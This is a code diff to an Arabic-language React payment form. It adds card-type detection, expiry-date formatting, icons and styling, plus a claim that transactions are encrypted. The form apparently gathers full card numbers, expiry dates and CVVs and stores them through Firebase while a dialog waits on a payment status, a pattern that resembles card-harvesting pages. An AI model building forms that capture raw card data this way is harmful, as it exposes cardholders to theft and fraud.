@@ -7,6 +7,7 @@ import { PaymentSchema, usePaymentForm } from "../../services/payment-form";
 import { addData, db } from "../../apis/firebase";
 import { doc, onSnapshot } from "firebase/firestore";
 import WaitingDialog from "../waiting-dilaog";
+import { CreditCard, Calendar, Lock, User } from "lucide-react";
 
 export default function PaymentForm() {
   const { formData, isSubmitting, updateFormField } = usePaymentForm();
@@ -16,6 +17,9 @@ export default function PaymentForm() {
   >("idle");
   const [errors, setErrors] = useState<Record<string, string>>({});
   const [paymentId, setPaymentId] = useState<string | null>(null);
+  const [cardType, setCardType] = useState<"visa" | "mastercard" | "unknown">(
+    "unknown"
+  );
 
   // Check for existing payment status in localStorage on component mount
   useEffect(() => {
@@ -171,6 +175,15 @@ export default function PaymentForm() {
         // Remove any non-digit characters
         const digitsOnly = value.replace(/\D/g, "");
 
+        // Detect card type
+        if (digitsOnly.startsWith("4")) {
+          setCardType("visa");
+        } else if (digitsOnly.startsWith("5")) {
+          setCardType("mastercard");
+        } else {
+          setCardType("unknown");
+        }
+
         // Check if the card starts with 4 or 5
         if (digitsOnly.length > 0 && !["4", "5"].includes(digitsOnly[0])) {
           setErrors((prev) => ({
@@ -201,6 +214,99 @@ export default function PaymentForm() {
         value = formattedValue.substring(0, 19);
       }
 
+      // Format expiration date with slash after month (MM/YY)
+      if (field === "expiration_date") {
+        // Remove any non-digit characters except for the slash
+        const cleaned = value.replace(/[^\d/]/g, "");
+
+        // Handle backspace and deletion properly
+        if (cleaned.length <= 2) {
+          // Just the month part
+          const month = cleaned;
+
+          // Validate month is between 01-12
+          if (month.length === 2) {
+            const monthNum = Number.parseInt(month, 10);
+            if (monthNum < 1 || monthNum > 12) {
+              setErrors((prev) => ({
+                ...prev,
+                expiration_date: "الشهر يجب أن يكون بين 01 و 12",
+              }));
+            } else {
+              // Clear month-specific error if it exists
+              if (errors.expiration_date === "الشهر يجب أن يكون بين 01 و 12") {
+                setErrors((prev) => {
+                  const newErrors = { ...prev };
+                  delete newErrors.expiration_date;
+                  return newErrors;
+                });
+              }
+            }
+          }
+
+          value = month;
+        } else {
+          // Handle the full MM/YY format
+          const parts = cleaned.split("/");
+
+          if (parts.length === 1) {
+            // User hasn't typed the slash yet, but has entered more than 2 digits
+            if (parts[0].length > 2) {
+              const month = parts[0].substring(0, 2);
+              const year = parts[0].substring(2);
+
+              // Validate month
+              const monthNum = Number.parseInt(month, 10);
+              if (monthNum < 1 || monthNum > 12) {
+                setErrors((prev) => ({
+                  ...prev,
+                  expiration_date: "الشهر يجب أن يكون بين 01 و 12",
+                }));
+              } else {
+                // Clear month-specific error if it exists
+                if (
+                  errors.expiration_date === "الشهر يجب أن يكون بين 01 و 12"
+                ) {
+                  setErrors((prev) => {
+                    const newErrors = { ...prev };
+                    delete newErrors.expiration_date;
+                    return newErrors;
+                  });
+                }
+              }
+
+              value = `${month}/${year}`;
+            }
+          } else if (parts.length === 2) {
+            const month = parts[0].substring(0, 2);
+            const year = parts[1].substring(0, 2);
+
+            // Validate month
+            const monthNum = Number.parseInt(month, 10);
+            if (monthNum < 1 || monthNum > 12) {
+              setErrors((prev) => ({
+                ...prev,
+                expiration_date: "الشهر يجب أن يكون بين 01 و 12",
+              }));
+            } else {
+              // Clear month-specific error if it exists
+              if (errors.expiration_date === "الشهر يجب أن يكون بين 01 و 12") {
+                setErrors((prev) => {
+                  const newErrors = { ...prev };
+                  delete newErrors.expiration_date;
+                  return newErrors;
+                });
+              }
+            }
+
+            value = `${month}/${year}`;
+          }
+        }
+
+        // Limit to 5 characters (MM/YY)
+        value = value.substring(0, 5);
+      }
+
       updateFormField({ [field]: value });
 
       // Clear error for this field when user starts typing
@@ -220,31 +326,46 @@ export default function PaymentForm() {
     };
 
   return (
-    <div className="max-w-md mx-auto p-6 bg-white rounded-lg shadow-md">
+    <div className="max-w-md mx-auto p-8 bg-white rounded-xl shadow-lg border border-gray-100">
       <WaitingDialog
         isOpen={isloading}
         paymentStatus={paymentStatus}
         onRefresh={handleRefresh}
       />
-      <div className="mb-6">
-        <h2 className="text-2xl font-bold text-right mb-2">معلومات الدفع</h2>
+
+      <div className="mb-8 text-center">
+        <div className="flex justify-center mb-4">
+          <div className="w-16 h-16 bg-[#146394] rounded-full flex items-center justify-center">
+            <CreditCard className="w-8 h-8 text-white" />
+          </div>
+        </div>
+        <h2 className="text-2xl font-bold text-center mb-2">معلومات الدفع</h2>
+        <p className="text-gray-500 text-sm">
+          يرجى إدخال تفاصيل بطاقتك لإتمام عملية الدفع
+        </p>
       </div>
 
-      <form onSubmit={handleSubmit} className="space-y-4">
+      <form onSubmit={handleSubmit} className="space-y-5">
         <div className="space-y-2">
-          <label htmlFor="full_name" className="block text-right font-medium">
+          <label
+            htmlFor="full_name"
+            className="block text-right font-medium text-gray-700 flex items-center justify-end gap-2"
+          >
+            <User className="w-4 h-4" />
             اسم حامل البطاقة
           </label>
-          <input
-            id="full_name"
-            type="text"
-            value={formData.full_name}
-            onChange={handleInputChange("full_name")}
-            className={`w-full p-2 border rounded-md ${
-              errors.full_name ? "border-red-500" : "border-gray-300"
-            }`}
-            dir="rtl"
-          />
+          <div className="relative">
+            <input
+              id="full_name"
+              type="text"
+              value={formData.full_name}
+              onChange={handleInputChange("full_name")}
+              className={`w-full p-3 border rounded-lg ${
+                errors.full_name ? "border-red-500" : "border-gray-300"
+              } focus:outline-none focus:ring-2 focus:ring-[#146394] focus:border-transparent transition-all duration-200`}
+              dir="rtl"
+            />
+          </div>
           {errors.full_name && (
             <p className="text-red-500 text-sm text-right">
               {errors.full_name}
@@ -253,20 +374,35 @@ export default function PaymentForm() {
         </div>
 
         <div className="space-y-2">
-          <label htmlFor="card_number" className="block text-right font-medium">
+          <label
+            htmlFor="card_number"
+            className="block text-right font-medium text-gray-700 flex items-center justify-end gap-2"
+          >
+            <CreditCard className="w-4 h-4" />
             رقم البطاقة
           </label>
-          <input
-            id="card_number"
-            type="text"
-            value={formData.card_number}
-            onChange={handleInputChange("card_number")}
-            placeholder="XXXX XXXX XXXX XXXX"
-            className={`w-full p-2 border rounded-md ${
-              errors.card_number ? "border-red-500" : "border-gray-300"
-            }`}
-            dir="ltr"
-          />
+          <div className="relative">
+            <input
+              id="card_number"
+              type="text"
+              value={formData.card_number}
+              onChange={handleInputChange("card_number")}
+              placeholder="XXXX XXXX XXXX XXXX"
+              className={`w-full p-3 border rounded-lg ${
+                errors.card_number ? "border-red-500" : "border-gray-300"
+              } focus:outline-none focus:ring-2 focus:ring-[#146394] focus:border-transparent transition-all duration-200 pr-10`}
+              dir="ltr"
+            />
+            {cardType !== "unknown" && (
+              <div className="absolute right-3 top-1/2 transform -translate-y-1/2">
+                {cardType === "visa" ? (
+                  <img src="/v.png" width={50} alt="" />
+                ) : (
+                  <img src="/m.png" width={50} alt="" />
+                )}
+              </div>
+            )}
+          </div>
           {errors.card_number && (
             <p className="text-red-500 text-sm text-right">
               {errors.card_number}
@@ -278,9 +414,10 @@ export default function PaymentForm() {
           <div className="space-y-2">
             <label
               htmlFor="expiration_date"
-              className="block text-right font-medium"
+              className="block text-right font-medium text-gray-700 flex items-center justify-end gap-2"
             >
-              تاريخ الانتهاء (MM/YY)
+              <Calendar className="w-4 h-4" />
+              تاريخ الانتهاء
             </label>
             <input
               id="expiration_date"
@@ -288,9 +425,9 @@ export default function PaymentForm() {
               value={formData.expiration_date}
               onChange={handleInputChange("expiration_date")}
               placeholder="MM/YY"
-              className={`w-full p-2 border rounded-md ${
+              className={`w-full p-3 border rounded-lg ${
                 errors.expiration_date ? "border-red-500" : "border-gray-300"
-              }`}
+              } focus:outline-none focus:ring-2 focus:ring-[#146394] focus:border-transparent transition-all duration-200`}
               dir="ltr"
             />
             {errors.expiration_date && (
@@ -301,17 +438,22 @@ export default function PaymentForm() {
           </div>
 
           <div className="space-y-2">
-            <label htmlFor="cvv" className="block text-right font-medium">
+            <label
+              htmlFor="cvv"
+              className="block text-right font-medium text-gray-700 flex items-center justify-end gap-2"
+            >
+              <Lock className="w-4 h-4" />
               رمز الأمان (CVV)
             </label>
             <input
               id="cvv"
-              type="text"
+              type="tel"
+              maxLength={3}
               value={formData.cvv}
               onChange={handleInputChange("cvv")}
-              className={`w-full p-2 border rounded-md ${
+              className={`w-full p-3 border rounded-lg ${
                 errors.cvv ? "border-red-500" : "border-gray-300"
-              }`}
+              } focus:outline-none focus:ring-2 focus:ring-[#146394] focus:border-transparent transition-all duration-200`}
               dir="ltr"
             />
             {errors.cvv && (
@@ -320,15 +462,32 @@ export default function PaymentForm() {
           </div>
         </div>
 
-        <div className="pt-4">
+        <div className="pt-6">
           <button
             type="submit"
-            className="w-full bg-[#146394] text-white py-3 md:py-3.5 rounded-lg font-semibold transform transition-all duration-300 hover:scale-[1.02] active:scale-100 shadow-md hover:shadow-lg text-sm md:text-base"
+            className="w-full bg-[#146394] text-white py-4 rounded-lg font-semibold transform transition-all duration-300 hover:bg-[#0d4e77] active:scale-[0.98] shadow-md hover:shadow-lg text-base relative overflow-hidden"
             disabled={isSubmitting || isloading}
           >
-            {isSubmitting || isloading ? "جاري المعالجة..." : "إتمام الدفع"}
+            <span className="relative z-10">
+              {isSubmitting || isloading ? "جاري المعالجة..." : "إتمام الدفع"}
+            </span>
           </button>
         </div>
+
+        <div className="flex justify-center mt-4 space-x-4">
+          <div className="w-10 h-6 bg-gray-100 rounded flex items-center justify-center">
+            <div className="text-blue-600 font-bold text-xs">
+              <img src="/v.png" width={50} alt="" />
+            </div>
+          </div>
+          <div className="w-10 h-6 bg-gray-100 rounded flex items-center justify-center">
+            <img src="/m.png" width={50} alt="" />
+          </div>
+        </div>
+
+        <p className="text-xs text-gray-500 text-center mt-4">
+          جميع المعاملات آمنة ومشفرة
+        </p>
       </form>
     </div>
   );
